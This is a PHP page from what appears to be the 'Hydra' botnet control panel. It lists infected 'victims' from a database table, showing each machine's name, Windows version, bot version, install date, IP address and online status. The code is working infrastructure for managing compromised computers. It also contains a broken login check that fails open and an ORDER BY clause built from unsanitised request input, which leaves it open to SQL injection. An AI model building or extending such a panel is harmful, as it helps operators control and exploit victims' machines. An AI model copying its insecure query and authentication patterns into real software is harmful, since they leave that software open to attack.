<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
?>
<div class="padding">
	<table width="750" border="0" cellspacing="0" cellpadding="0">
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td>
				<h2>Bots</h2>
			</td>
		</tr>
		<tr><td>
		<a href="#" class="button" onClick="sortBots('ASC');">Ascending</a><a href="#" class="button" onClick="sortBots('DESC');">Descending</a>
		</td></tr>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td>
				<table class="smalltable" style="width: 765px;">
					<tr>	
						<th style="width:20px">&nbsp;</th>
						<th style="width:20px">&nbsp;</th>
						<th>Name</th>
						<th>Operating System</th>
						<th>Version</th>
						<th>Install Date</th>
						<th>IP</th>
						<th>Status</th>
					</tr>
					 <?php
						include("inc/config.php");
						include("inc/funcs.php");
							
						if(isset($_GET['query']))
						{
							$order = "ORDER BY ID ".$_GET['query'];
						}
						else
						{
							$order = "";
						}
						
						$query = mysql_query("SELECT * FROM hydra_victims ".mysql_real_escape_string($order));
						while($ds = mysql_fetch_array($query)) {
							/*if($ds['ConTime'] > (time()-$time_on))
							{
								$status = '<span class="green">Online</span>';
							}
							else
							{
								$status = '<span class="red">Offline</span>';
							}*/
							$status = ($ds['ConTime'] > time()-$time_on ? '<span class="green">Online</span>' : '<span class="red">Offline</span>');
							
							echo '<tr><td>#'.$ds['ID'].'</td><td><img src="images/icons/flags/'.strtolower($ds['Country']).'.png" alt="flag"/></td><td>'.$ds['PCName'].'</td><td>'.$ds['WinVersion'].'</td><td>'.$ds['BotVersion'].'</td><td>'.date("d.m.Y", $ds['InstTime']).'</td><td>'.$ds['IP'].'</td><td>'.$status.'</td></tr>';
						}
					?>
				</table>
			</td>
		</tr>
	</table>
</div>